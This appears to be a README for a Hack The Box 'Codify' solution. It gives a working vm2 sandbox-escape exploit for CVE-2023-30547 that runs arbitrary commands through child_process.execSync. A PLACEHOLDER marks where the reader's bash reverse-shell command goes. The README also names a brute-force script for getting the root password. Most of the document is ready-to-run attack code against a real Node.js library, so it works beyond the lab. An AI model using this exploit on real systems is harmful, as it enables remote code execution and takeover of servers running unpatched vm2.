# HTB-Codify
Initial foothold and privilege escalation for HTB Codify 


# Reverse Shell

Based on [CVE-2023-30547](https://kaist-hacking.github.io/)

Replace `PLACEHOLDER` with your bash command. 


```
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('PLACEHOLDER');
}
`

console.log(vm.run(code));

```

# Privilege Escalation 

*execute* ``root_bruteforce.py`` to bruteforce root password!
